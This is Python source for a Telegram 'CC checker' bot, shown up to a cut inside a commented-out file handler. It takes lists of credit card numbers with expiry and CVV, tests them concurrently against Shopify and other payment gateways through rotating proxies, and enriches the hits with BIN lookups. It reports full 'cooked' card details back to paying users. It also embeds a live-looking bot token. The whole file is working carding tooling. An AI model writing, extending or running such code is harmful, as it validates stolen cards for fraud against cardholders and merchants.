import os
import re
import json
import random
import time
import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import threading
import functools
import uuid 
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import socket
import ssl
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback
import gates

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
socket.setdefaulttimeout(30)
from collections import Counter
import logging
logger = logging.getLogger(__name__)
from flask import Flask
from complete_handler import setup_complete_handler, check_site_shopify_direct
from enhanced_shopify_checker import check_site_shopify_full          
app = Flask(__name__)

@app.route('/')
def home():
    return "I am alive"

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server)
    t.start()
    
BOT_TOKEN = "6521915796:AAHCFIh7fe7diCWRFRxdCYsMcbn_3pjZMwI"

OWNER_ID = [5963548505, 1614278744]
DARKS_ID = 5963548505

bot = telebot.TeleBot(BOT_TOKEN)

def load_json(file_path, default_data):
    """Load JSON from LOCAL file with error handling"""
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
        
        # Load from local file
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            return data
        else:
            # File doesn't exist, create it with default data
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(default_data, f, indent=2)
            return default_data
            
    except Exception as e:
        print(f"Error loading {file_path}: {e}")
        return default_data

def save_json(file_path, data):
    """Save JSON to LOCAL file"""
    try:
        os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"Error saving {file_path}: {e}")
        return False

CCS_FILE = 'data/credit_cards.json'
SITES_FILE = "sites.json"
PROXIES_FILE = "proxies.json"
STATS_FILE = "stats.json"
SETTINGS_FILE = "settings.json"
USERS_FILE = "users.json"
GROUPS_FILE = "groups.json"
BOT_START_TIME = time.time()
USER_PROXIES_FILE = "user_proxies.json"
user_proxies_data = load_json(USER_PROXIES_FILE, {})

# Price filter setting (default: no filter)
price_filter = None

# Flood control dictionary
user_last_command = {}

# Add after load_json calls (around line 100)
print("=== DEBUG START ===")
print(f"Sites data: {SITES_FILE}")
print(f"Sites count: {len(SITES_FILE.get('sites', [])) if isinstance(SITES_FILE, dict) else 'WRONG TYPE'}")
print(f"Proxies data: {PROXIES_FILE}")
print(f"Proxies count: {len(PROXIES_FILE.get('proxies', [])) if isinstance(PROXIES_FILE, dict) else 'WRONG TYPE'}")
print("=== DEBUG END ===")

@bot.message_handler(commands=['testbtn'])
def test_btn(message):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("Test Cancel", callback_data="test_cancel")
    markup.add(btn)
    bot.send_message(message.chat.id, "Test button", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "test_cancel")
def test_cancel(call):
    bot.answer_callback_query(call.id, "Cancel clicked!")
    bot.delete_message(call.message.chat.id, call.message.message_id)

def load_json(file_path, default_data):
    """Load JSON from LOCAL file (no cloud)"""
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
        
        # Load from local file
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            # Handle different file structures (same as before)
            if file_path == SITES_FILE:
                if isinstance(data, dict) and 'sites' in data:
                    return data
                elif isinstance(data, list):
                    return {"sites": data}
                else:
                    return {"sites": []}
                    
            elif file_path == PROXIES_FILE:
                if isinstance(data, dict) and 'proxies' in data:
                    return data
                elif isinstance(data, list):
                    return {"proxies": data}
                else:
                    return {"proxies": []}
                    
            elif file_path == STATS_FILE:
                if not isinstance(data, dict):
                    data = {}
                for key in ['approved', 'declined', 'cooked', 'mass_approved', 'mass_declined', 'mass_cooked']:
                    if key not in data:
                        data[key] = default_data.get(key, 0)
                return data
                
            elif file_path == SETTINGS_FILE:
                if isinstance(data, dict):
                    return data
                else:
                    return {"price_filter": None}
            
            elif file_path == USERS_FILE:
                if isinstance(data, dict):
                    return data
                else:
                    return {}
            
            elif file_path == GROUPS_FILE:
                if isinstance(data, dict):
                    return data
                else:
                    return {}
            
            # For any other file, return as-is
            return data
        else:
            # File doesn't exist, create it with default data
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(default_data, f, indent=2)
            return default_data
            
    except Exception as e:
        print(f"Error loading {file_path}: {e}")
        return default_data

def save_json(file_path, data):
    """Save JSON to LOCAL file (no cloud)"""
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
        
        # Save to local file
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        return True
        
    except Exception as e:
        print(f"Error saving {file_path}: {e}")
        return False

# Load data with proper structure validation
sites_data = load_json(SITES_FILE, {"sites": []})

# FIX: Handle both dict and array formats
if isinstance(sites_data, list):
    sites_data = {"sites": sites_data}
elif not isinstance(sites_data, dict) or 'sites' not in sites_data:
    sites_data = {"sites": []}

proxies_data = load_json(PROXIES_FILE, {"proxies": []})

# FIX: Handle both dict and array formats  
if isinstance(proxies_data, list):
    proxies_data = {"proxies": proxies_data}
elif not isinstance(proxies_data, dict) or 'proxies' not in proxies_data:
    proxies_data = {"proxies": []}

print(f"✅ LOADED - Sites: {len(sites_data['sites'])}, Proxies: {len(proxies_data['proxies'])}")

CCS_FILE = 'data/credit_cards.json'

def load_ccs_data():
    """Load credit cards from file"""
    try:
        with open(CCS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'credit_cards': [], 'last_updated': None}

# Initialize CC data
ccs_data = load_ccs_data()
# Load stats with proper defaults
default_stats = {
    "approved": 0, "declined": 0, "cooked": 0, 
    "mass_approved": 0, "mass_declined": 0, "mass_cooked": 0
}
stats_data = load_json(STATS_FILE, default_stats)

# Load settings
settings_data = load_json(SETTINGS_FILE, {"price_filter": None})
price_filter = settings_data.get("price_filter")

# Load users and groups data
users_data = load_json(USERS_FILE, {})
groups_data = load_json(GROUPS_FILE, {})

status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '✅',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐂𝐨𝐨𝐤𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

# Check if user is owner
def is_owner(user_id):
    return user_id in OWNER_ID

# Check if user is approved
def is_approved(user_id):
    user_id_str = str(user_id)
    if user_id_str in users_data:
        expiry_date = datetime.fromisoformat(users_data[user_id_str]['expiry'])
        return expiry_date > datetime.now()
    return False

# Check if group is approved
def is_group_approved(chat_id):
    chat_id_str = str(chat_id)
    return chat_id_str in groups_data

# Flood control decorator
def flood_control(func):
    @functools.wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # No flood control for owners
        if is_owner(user_id):
            return func(message)
            
        # Check if user is approved (no flood control for approved users)
        if is_approved(user_id):
            return func(message)
        
        # Check if it's a group and group is approved (no flood control in approved groups)
        if chat_type in ['group', 'supergroup'] and is_group_approved(message.chat.id):
            return func(message)
        
        # Flood control for others
        current_time = time.time()
        if user_id in user_last_command:
            time_diff = current_time - user_last_command[user_id]
            if time_diff < 10:  # 10 seconds flood wait
                wait_time = 10 - int(time_diff)
                bot.reply_to(message, f"⏳ Please wait {wait_time} seconds before using another command.")
                return
        
        user_last_command[user_id] = current_time
        return func(message)
    return wrapper

def process_response_shopify(api_response, price="0.00"):
    """
    Process the response from check_site_shopify_direct (enhanced version)
    Returns (response_text, status, gateway)
    """
    if not isinstance(api_response, dict):
        return str(api_response), "ERROR", "Shopify"
    
    response_text = api_response.get('Response', 'Unknown')
    status = api_response.get('status', 'ERROR')
    gateway = api_response.get('gateway', 'Shopify Full Flow')
    
    return response_text, status, gateway


# Check access control
def check_access(func):
    @functools.wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        chat_type = message.chat.type
        
        # Always allow owners
        if is_owner(user_id):
            return func(message)
        
        # Check if it's a private chat
        if chat_type == 'private':
            if not is_approved(user_id):
                bot.reply_to(message, "🚫 <b>Access Denied!</b>\n\nThis bot is locked for private messages.\nPlease contact the owner for access.\n\nYou Can use here : https://t.me/+d4FuWKR6Ni9lNTdl", parse_mode='HTML')
                return
        
        # Check if it's a group
        elif chat_type in ['group', 'supergroup']:
            if not is_group_approved(message.chat.id):
                bot.reply_to(message, "🚫 <b>Group Not Approved!</b>\n\nThis group is not authorized to use this bot.\nPlease contact the owner for approval. \n\n  Owner @Unknown_bolte", parse_mode='HTML')
                return
        
        # Check if user is approved (for groups)
        elif not is_approved(user_id):
            bot.reply_to(message, "🚫 <b>User Not Approved!</b>\n\nYou are not authorized to use this bot.\nPlease contact the owner for access.You Can use here : https://t.me/+d4FuWKR6Ni9lNTdl", parse_mode='HTML')
            return
        
        return func(message)
    return wrapper

# Extract CC from various formats
def extract_cc(text):
    # Remove any non-digit characters except |, :, ., /, and space
    cleaned = re.sub(r'[^\d|:./ ]', '', text)
    
    # Handle various formats
    if '|' in cleaned:
        parts = cleaned.split('|')
    elif ':' in cleaned:
        parts = cleaned.split(':')
    elif '.' in cleaned:
        parts = cleaned.split('.')
    elif '/' in cleaned:
        parts = cleaned.split('/')
    else:

        if len(cleaned) >= 16:
            cc = cleaned[:16]
            rest = cleaned[16:]
            if len(rest) >= 4:
                mm = rest[:2]
                rest = rest[2:]
                if len(rest) >= 4:
                    yyyy = rest[:4] if len(rest) >= 4 else rest[:2]
                    rest = rest[4:] if len(rest) >= 4 else rest[2:]
                    if len(rest) >= 3:
                        cvv = rest[:3]
                        parts = [cc, mm, yyyy, cvv]
    
    if len(parts) < 4:
        return None
    
    # Standardize the format
    cc = parts[0].strip()
    mm = parts[1].strip().zfill(2)  # Ensure 2-digit month
    yyyy = parts[2].strip()
    cvv = parts[3].strip()
    
    # Handle 2-digit year - FIXED LOGIC
    if len(yyyy) == 2:
        current_year_short = datetime.now().year % 100
        year_int = int(yyyy)
        # If 2-digit year is less than or equal to current year, assume 2000s
        # Otherwise assume 1900s (for expired cards)
        yyyy = f"20{yyyy}" if year_int >= current_year_short else f"19{yyyy}"
    
    return f"{cc}|{mm}|{yyyy}|{cvv}"

# Extract multiple CCs from text
def extract_multiple_ccs(text):
    # Split by newlines or other common separators
    lines = re.split(r'[\n\r,;]+', text)
    ccs = []
    
    for line in lines:
        cc = extract_cc(line)
        if cc:
            ccs.append(cc)
    
    return ccs

# Get bin info
def get_bin_info(card_number):
    # Clean the card number (remove any non-digit characters)
    card_number = re.sub(r'\D', '', card_number)
    
    # Get the first 6 digits for BIN
    if len(card_number) < 6:
        return None
        
    bin_code = card_number[:6]
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=20)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def create_session_with_retries():
    """Create a requests session with retry strategy and longer timeouts"""
    session = requests.Session()
    
    # Configure retry strategy with longer timeouts
    retry_strategy = Retry(
        total=3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET"],
        backoff_factor=1
    )
    
    # Mount adapters with retry strategy
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=10,
        pool_maxsize=10
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def is_valid_response(response):
    if not response:
        return False
    
    response_upper = response.get("Response", "").upper()

    return any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                           'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                           'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED' , "INCORRECT_NUMBER" , "INVALID_TOKEN" , "AUTHENTICATION_ERROR"])


# ============================================================================
# 🔐 USER AUTHORIZATION
# ============================================================================

def is_user_allowed(user_id):
    """
    Robust Security Check for Owners and Premium Users
    """
    try:
        # 1. Convert to integer for Owner Check (OWNER_ID list usually contains ints)
        user_id_int = int(user_id)
        if user_id_int in OWNER_ID:
            return True
        
        # 2. Convert to String for Database Check (JSON keys are always strings)
        user_id_str = str(user_id)
        
        # 3. Check if user exists in users_data
        user_data = users_data.get(user_id_str)
        if not user_data:
            return False
            
        # 4. Check Expiry
        # Supports both 'expiry' (from /pro command) and 'expiry_date' keys
        expiry_str = user_data.get('expiry') or user_data.get('expiry_date')
        
        if not expiry_str:
            return False # User exists but has no expiry date set
            
        expiry_date = datetime.fromisoformat(expiry_str)
        
        if datetime.now() > expiry_date:
            return False # Expired
            
        return True # Approved and Active

    except Exception as e:
        print(f"⚠️ Auth Error for {user_id}: {e}")
        return False
# ============================================================================
# 1. READ FILE DIRECTLY FROM TELEGRAM (NO DOWNLOAD)
# ============================================================================

def read_telegram_file_to_memory(bot, file_id):
    """
    Read file directly into memory without saving to disk
    Returns: file content as string
    """
    try:
        file_info = bot.get_file(file_id)
        file_bytes = bot.download_file(file_info.file_path)
        content = file_bytes.decode('utf-8', errors='ignore')
        return content
    except Exception as e:
        logger.error(f"❌ File read error: {e}")
        return None


# ============================================================================
# 2. EXTRACT CCs FROM TEXT (MEMORY-BASED)
# ============================================================================

def extract_ccs_from_text(text):
    """
    Extract credit cards from text in format: CC|MM|YYYY|CVV
    Returns: list of CC strings
    """
    valid_ccs = []
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        parts = line.split('|')
        if len(parts) != 4:
            continue
        
        cc, mm, yyyy, cvv = parts
        
        # Validate CC (13-19 digits)
        if not cc.isdigit() or not (13 <= len(cc) <= 19):
            continue
        
        # Validate MM (01-12)
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            continue
        
        # Validate YYYY (4 digits, reasonable year)
        if not yyyy.isdigit() or len(yyyy) != 4:
            continue
        
        # Validate CVV (3-4 digits)
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            continue
        
        valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    
    return valid_ccs


# ============================================================================
# 3. ANALYZE CCs FOR DUPLICATES & BIN PATTERNS
# ============================================================================

def analyze_cc_patterns(ccs):
    """
    Analyze CCs for:
    - Unique BINs (first 6 digits)
    - Duplicate detection
    - Distribution stats
    """
    if not ccs:
        return None
    
    bins = [cc.split('|')[0][:6] for cc in ccs]
    bin_counter = Counter(bins)
    
    unique_bins = len(set(bins))
    max_duplicate = max(bin_counter.values())
    duplicate_percent = (max_duplicate / len(ccs)) * 100
    
    stats = {
        'total_ccs': len(ccs),
        'unique_bins': unique_bins,
        'max_duplicate': max_duplicate,
        'duplicate_percent': round(duplicate_percent, 1),
        'bin_distribution': dict(sorted(bin_counter.items(), key=lambda x: x[1], reverse=True)[:10])
    }
    
    log_msg = f"🔍 {unique_bins} unique BINs | Max duplicate: {max_duplicate} ({duplicate_percent:.0f}%)"
    logger.info(log_msg)
    
    return stats


# ============================================================================
# 4. GET BIN INFO (FROM YOUR CODE)
# ============================================================================

def get_bin_info_from_api(card_number):
    """
    Get BIN information from your existing function
    Uses the same API as your typed CC checking
    """
    import re
    card_number = re.sub(r'\D', '', card_number)
    
    if len(card_number) < 6:
        return None
        
    bin_code = card_number[:6]
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=20)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    
    return {
        'bin': bin_code,
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country_name': 'UNKNOWN',
        'country_flag': '🇺🇳'
    }


# ============================================================================
# 5. CONCURRENT CARD CHECKING (FAST)
# ============================================================================

def check_card_concurrent(cc, filtered_sites, proxy, check_function, max_retries=3):
    """
    Check single card with max 3 sites concurrently
    Returns when first APPROVED found or all sites tried
    
    Args:
        cc: CC string (CC|MM|YYYY|CVV)
        filtered_sites: List of available sites
        proxy: Proxy to use
        check_function: Your existing check_site function
        max_retries: Max sites to try per card (default 3)
    
    Returns: dict with result
    """
    try:
        # Pick random 3 sites to try
        sites_to_try = random.sample(filtered_sites, min(max_retries, len(filtered_sites)))
        
        for site_obj in sites_to_try:
            try:
                site_url = site_obj['url']
                site_name = site_obj.get('name', site_url)
                price = site_obj.get('price', '0.00')
                gateway = site_obj.get('gateway', 'Unknown')
                
                # Call your existing check_site function
                api_response = check_function(site_url, cc, proxy)
                
                # Get bin info from your code
                bin_info = get_bin_info_from_api(cc.split('|')[0])
                
                # Process response using your existing logic
                response, status, gateway_result = process_response_shopify(api_response, price)
                
                # If valid response, return immediately
                if is_valid_response(api_response):
                    return {
                        'cc': cc,
                        'response': response,
                        'status': status,
                        'gateway': gateway_result or gateway,
                        'price': price,
                        'site': site_name,
                        'site_url': site_url,
                        'bin_info': bin_info,
                        'timestamp': datetime.now().isoformat()
                    }
                
                time.sleep(0.05)  # Small delay between sites
                
            except requests.Timeout:
                continue
            except Exception as e:
                logger.error(f"Check error for {cc}: {e}")
                continue
        
        # If no site worked, return error result
        return {
            'cc': cc,
            'response': 'All sites failed',
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': 'No valid response',
            'site_url': 'N/A',
            'bin_info': get_bin_info_from_api(cc.split('|')[0]),
            'timestamp': datetime.now().isoformat()
        }
    
    except Exception as e:
        logger.error(f"Card check failed: {e}")
        return {
            'cc': cc,
            'response': str(e),
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': 'Error',
            'site_url': 'N/A',
            'bin_info': get_bin_info_from_api(cc.split('|')[0]),
            'timestamp': datetime.now().isoformat()
        }


# ============================================================================
# 6. MAIN MASS CHECK FUNCTION - CONCURRENT
# ============================================================================
def process_mass_gate_check(bot, message, ccs, gate_func, gate_name):
    """
    Generic mass check for specific API gates (PayPal, Stripe, etc)
    """
    total_ccs = len(ccs)
    results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
    
    start_time = time.time()
    last_update = time.time()
    processed_count = 0
    
    status_msg = bot.send_message(
        message.chat.id,
        f"🔥 <b>MASS {gate_name} STARTED</b>\n⏳ Checking {total_ccs} cards...",
        parse_mode='HTML'
    )
    
    # Use ThreadPool for speed
    with ThreadPoolExecutor(max_workers=5) as executor: # Lower workers for API safety
        futures = {}
        for cc in ccs:
            proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
            # Submit task: gate_func(cc, proxy)
            future = executor.submit(gate_func, cc, proxy)
            futures[future] = cc
            
        for future in as_completed(futures):
            cc = futures[future]
            try:
                response_text, status = future.result()
                
                # Get Bin Info
                bin_info = get_bin_info(cc.split('|')[0])
                
                result_obj = {
                    'cc': cc,
                    'response': response_text,
                    'status': status,
                    'gateway': gate_name,
                    'price': 'Auth/Charge',
                    'site': 'API',
                    'bin_info': bin_info
                }

                if status == 'APPROVED':
                    results['cooked'].append(result_obj)
                    update_stats('COOKED', mass_check=True)
                elif status == 'DECLINED':
                    results['declined'].append(result_obj)
                    update_stats('DECLINED', mass_check=True)
                else:
                    results['error'].append(result_obj)
                    update_stats('ERROR', mass_check=True)
                
                processed_count += 1
                
                # Update UI every 2 seconds
                if time.time() - last_update > 2:
                    bot.edit_message_text(
                        f"┏━━━━━━━⍟\n┃ <b>MASS {gate_name}</b>\n┗━━━━━━━━━━━⊛\n\n"
                        f"<b>Progress:</b> {processed_count}/{total_ccs}\n"
                        f"✅ Live: {len(results['cooked'])}\n"
                        f"❌ Die: {len(results['declined'])}",
                        message.chat.id,
                        status_msg.message_id,
                        parse_mode='HTML'
                    )
                    last_update = time.time()
                    
            except Exception as e:
                processed_count += 1
                
    # Final Report
    duration = time.time() - start_time
    bot.send_message(
        message.chat.id,
        f"✅ <b>{gate_name} Check Complete</b>\n"
        f"Total: {total_ccs} | Time: {duration:.2f}s\n"
        f"✅ Live: {len(results['cooked'])}\n"
        f"❌ Dead: {len(results['declined'])}",
        parse_mode='HTML'
    )
    
    # Send Hits
    if results['cooked']:
        msg = format_cooked_cards_detailed(results['cooked'])
        if len(msg) > 4000:
             with open("hits.txt", "w") as f: f.write(msg)
             with open("hits.txt", "rb") as f: bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, msg, parse_mode='HTML')

def process_mass_check_txt(bot, message, ccs, filtered_sites, proxies_data, check_function, is_valid_response, process_response, update_stats):
    """
    Mass check CCs from TXT file with concurrent processing
    
    Args:
        bot: TeleBot instance
        message: Telegram message object
        ccs: List of CC strings (CC|MM|YYYY|CVV)
        filtered_sites: Filtered sites based on price
        proxies_data: Proxy dictionary {'proxies': [...]}
        check_function: Your existing check_site function
        is_valid_response: Your response validation function
        process_response: Your response processing function
        update_stats: Your stats update function
    """
    total_ccs = len(ccs)
    results = {
        'cooked': [],
        'approved': [],
        'declined': [],
        'error': [],
        'timeout': []
    }
    
    start_time = time.time()
    last_update = time.time()
    processed_count = 0
    
    try:
        # Send initial message
        status_msg = bot.send_message(
            message.chat.id,
            "🔥 <b>MASS CHECK STARTED</b>\n⏳ Initializing concurrent checking...",
            parse_mode='HTML'
        )
        
        # Get proxy
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
        
        # CONCURRENT CHECKING WITH ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Submit all cards for checking
            futures = {
                executor.submit(check_card_concurrent, cc, filtered_sites, proxy, check_function, max_retries=3): idx
                for idx, cc in enumerate(ccs)
            }
            
            # Process results as they complete
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results_list = results
                    
                    # Categorize result
                    if result['status'] == 'APPROVED':
                        results['cooked'].append(result)
                        update_stats('APPROVED', mass_check=True)
                    elif result['status'] == 'APPROVED_OTP':
                        results['approved'].append(result)
                        update_stats('APPROVED_OTP', mass_check=True)
                    elif result['status'] in ['DECLINED', 'EXPIRED']:
                        results['declined'].append(result)
                        update_stats('DECLINED', mass_check=True)
                    elif result['status'] == 'TIMEOUT':
                        results['timeout'].append(result)
                    else:
                        results['error'].append(result)
                        update_stats('ERROR', mass_check=True)
                    
                    processed_count += 1
                    
                    # Update progress every 2 seconds
                    if time.time() - last_update > 2:
                        progress_msg = format_progress_update(
                            processed_count, total_ccs,
                            len(results['cooked']), len(results['approved'])
                        )
                        try:
                            bot.edit_message_text(
                                progress_msg,
                                message.chat.id,
                                status_msg.message_id,
                                parse_mode='HTML'
                            )
                        except:
                            pass
                        last_update = time.time()
                
                except Exception as e:
                    logger.error(f"Result processing error: {e}")
                    processed_count += 1
                    continue
        
        # Calculate final stats
        duration = time.time() - start_time
        total_cooked = len(results['cooked'])
        total_approved = len(results['approved'])
        total_declined = len(results['declined'])
        total_errors = len(results['error'])
        total_timeouts = len(results['timeout'])
        
        # Send final results
        final_msg = format_final_results_txt(
            total_cooked, total_approved, total_declined,
            total_errors, total_timeouts, total_ccs, duration
        )
        
        try:
            bot.edit_message_text(
                final_msg,
                message.chat.id,
                status_msg.message_id,
                parse_mode='HTML'
            )
        except:
            bot.send_message(message.chat.id, final_msg, parse_mode='HTML')
        
        # Send cooked cards in separate message (if any)
        if results['cooked']:
            cooked_msg = format_cooked_cards_detailed(results['cooked'])
            bot.send_message(message.chat.id, cooked_msg, parse_mode='HTML')
        
        # Send approved cards (if any)
        if results['approved']:
            approved_msg = format_approved_cards_detailed(results['approved'])
            bot.send_message(message.chat.id, approved_msg, parse_mode='HTML')
        
        return results
    
    except Exception as e:
        logger.error(f"Mass check failed: {traceback.format_exc()}")
        bot.send_message(
            message.chat.id,
            f"❌ <b>ERROR</b>: {str(e)}",
            parse_mode='HTML'
        )
        return results


# ============================================================================
# 7. FORMATTING FUNCTIONS
# ============================================================================

def format_progress_update(processed, total, cooked, approved):
    """Format live progress update"""
    percent = (processed / total * 100) if total > 0 else 0
    bar_length = 20
    filled = int(bar_length * processed / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_length - filled)
    
    return f"""
┏━━━━━━━⍟
┃ <b>𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆</b> ⚡
┗━━━━━━━━━━━⊛

<code>{bar}</code>
<b>Progress:</b> {processed}/{total} ({percent:.1f}%)

<b>Results So Far:</b>
[⌬] <b>𝐂𝐨𝐨𝐤𝐞𝐝</b>↣ {cooked} 🔥
[⌬] <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b>↣ {approved} ✅

⏳ Processing...
"""


def format_final_results_txt(cooked, approved, declined, errors, timeouts, total, duration):
    """Format final results"""
    speed = (total / duration) if duration > 0 else 0
    
    return f"""
┏━━━━━━━⍟
┃ <b>✅ MASS CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛

<b>━━━ RESULTS ━━━</b>
[⌬] <b>𝐂𝐨𝐨𝐤𝐞𝐝</b>↣ {cooked} 🔥
[⌬] <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b>↣ {approved} ✅
[⌬] <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b>↣ {declined} ❌
[⌬] <b>𝐓𝐢𝐦𝐞𝐨𝐮𝐭</b>↣ {timeouts} ⏱️
[⌬] <b>𝐄𝐫𝐫𝐨𝐫𝐬</b>↣ {errors} ⚠️

<b>━━━ STATS ━━━</b>
[⌬] <b>𝐓𝐨𝐭𝐚𝐥</b>↣ {total}
[⌬] <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧</b>↣ {duration:.2f}s
[⌬] <b>𝐒𝐩𝐞𝐞𝐝</b>↣ {speed:.1f} checks/sec

━━━━━━━━━━━━━━━━━━━━
"""


def format_cooked_cards_detailed(cooked_list):
    """Format cooked cards with full BIN details"""
    if not cooked_list:
        return "No cooked cards found"
    
    message = "┏━━━━━━━⍟\n┃ <b>🔥 COOKED CARDS FOUND! 🔥</b>\n┗━━━━━━━━━━━⊛\n\n"
    
    for idx, card in enumerate(cooked_list[:15], 1):
        cc = card['cc']
        cc_parts = cc.split('|')
        masked_cc = f"{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}"  # ← Full CC
        
        bin_info = card.get('bin_info', {})
        
        message += f"""
<b>[{idx}] Cooked Card</b>
[⌬] <b>𝐂𝐂</b>↣ <code>{masked_cc}</code>
[⌬] <b>𝐁𝐫𝐚𝐧𝐝</b>↣ {bin_info.get('brand', 'UNKNOWN')} {bin_info.get('type', 'UNKNOWN')}
[⌬] <b>𝐁𝐚𝐧𝐤</b>↣ {bin_info.get('bank', 'UNKNOWN')}
[⌬] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b>↣ {bin_info.get('country_name', 'UNKNOWN')} {bin_info.get('country_flag', '🇺🇳')}
[⌬] <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b>↣ {card['gateway']} [${card['price']}]
[⌬] <b>𝐒𝐢𝐭𝐞</b>↣ {card['site']}
[⌬] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b>↣ {card['response']}

"""
    
    if len(cooked_list) > 15:
        message += f"... and {len(cooked_list) - 15} more cooked cards\n"
    
    message += "━━━━━━━━━━━━━━━━━━━━"
    return message


def format_approved_cards_detailed(approved_list):
    """Format approved cards (OTP required) with BIN details"""
    if not approved_list:
        return "No approved cards found"
    
    message = "┏━━━━━━━⍟\n┃ <b>✅ APPROVED CARDS (OTP) ✅</b>\n┗━━━━━━━━━━━⊛\n\n"
    
    for idx, card in enumerate(approved_list[:15], 1):
        cc = card['cc']
        cc_parts = cc.split('|')
        masked_cc = f"{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}"
        
        bin_info = card.get('bin_info', {})
        
        message += f"""
<b>[{idx}] Approved Card</b>
[⌬] <b>𝐂𝐂</b>↣ <code>{masked_cc}</code>
[⌬] <b>𝐁𝐫𝐚𝐧𝐝</b>↣ {bin_info.get('brand', 'UNKNOWN')} {bin_info.get('type', 'UNKNOWN')}
[⌬] <b>𝐁𝐚𝐧𝐤</b>↣ {bin_info.get('bank', 'UNKNOWN')}
[⌬] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b>↣ {bin_info.get('country_name', 'UNKNOWN')} {bin_info.get('country_flag', '🇺🇳')}
[⌬] <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b>↣ {card['gateway']} [${card['price']}]
[⌬] <b>𝐒𝐢𝐭𝐞</b>↣ {card['site']}
[⌬] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b>↣ {card['response']}

"""
    
    if len(approved_list) > 15:
        message += f"... and {len(approved_list) - 15} more approved cards\n"
    
    message += "━━━━━━━━━━━━━━━━━━━━"
    return message


# ============================================================================
# 8. TXT FILE HANDLER & MESSAGE HANDLERS
# ============================================================================

# def setup_txt_mass_check_handler(bot, filtered_sites_func, proxies_data, check_function, is_valid_response, process_response, update_stats):
#     """
#     Setup TXT file mass checking handler
    
#     Add to your main app.py:
#     setup_txt_mass_check_handler(bot, get_filtered_sites, proxies_data, check_site, is_valid_response, process_response, update_stats)
#     """
    
#     global uploaded_ccs
#     uploaded_ccs = []
    
#    @bot.message_handler(content_types=['document'])
#     def handle_file_upload(message):
#         """Handle .txt file upload"""
